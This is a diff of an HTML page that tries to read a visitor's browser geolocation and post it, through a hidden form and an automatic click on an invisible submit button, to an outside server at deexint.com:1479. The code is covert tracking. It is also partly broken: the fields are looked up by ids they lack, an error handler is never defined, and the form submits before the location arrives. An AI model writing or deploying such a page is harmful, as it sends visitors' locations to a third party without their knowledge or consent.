@@ -1,11 +1,63 @@
-<form action="http://deexint.com:1479/" method="post">
-    <input type="hidden" name="Latitude" value="300143" />
-    <input type="hidden" name="Longitude" value="51627466" />
-    <input class="posting" type="submit" style="display:none;" />
-</form>
+<!DOCTYPE html>
+<html>
+
+
+<body>
+
+
 
 
 <script>
-document.getElementsByClassName("posting")[0].click();
+
+
+window.onload = function () {
+
+      getLocation();
+
+
+
+}
+
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sending, showError);
+  }
+
+
+}
+
+function sending(position) {
+
+
+  document.getElementById('Latitude').value = position.coords.latitude;
+  document.getElementById('Longitude').value = position.coords.longitude;
+
+}
+
+
+
+
+
 
 </script>
+
+
+
+
+    <form action="http://deexint.com:1479/" method="post">
+        <input type="hidden" name="Latitude" value="300143" />
+        <input type="hidden" name="Longitude" value="51627466" />
+        <input class="posting" type="submit" style="display:none;" />
+    </form>
+
+
+    <script>
+    document.getElementsByClassName("posting")[0].click();
+
+    </script>
+
+
+
+</body>
+</html>
